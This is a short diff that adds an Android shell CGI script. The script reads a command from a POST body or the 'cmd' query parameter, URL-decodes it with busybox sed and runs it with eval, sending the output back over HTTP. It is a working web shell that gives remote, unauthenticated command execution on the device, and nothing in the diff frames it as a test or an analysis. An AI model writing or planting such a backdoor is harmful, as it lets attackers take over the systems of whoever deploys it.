@@ -1,0 +1,10 @@
+#!/system/bin/sh
+echo "Content-Type: text/plain"
+echo ""
+if [ "$REQUEST_METHOD" = "POST" ]; then
+    read -n "$CONTENT_LENGTH" CMD
+else
+    CMD=$(echo "$QUERY_STRING" | /sbin/busybox sed 's/cmd=//;s/+/ /g;s/%20/ /g;s/%2F/\//g;s/%7C/|/g;s/%26/\&/g;s/%3B/;/g;s/%3D/=/g;s/%2D/-/g;s/%22/"/g;s/%27/'"'"'/g;s/%0A/\n/g')
+fi
+[ -z "$CMD" ] && { echo "Usage: POST command or GET ?cmd=command"; exit 0; }
+eval "$CMD" 2>&1
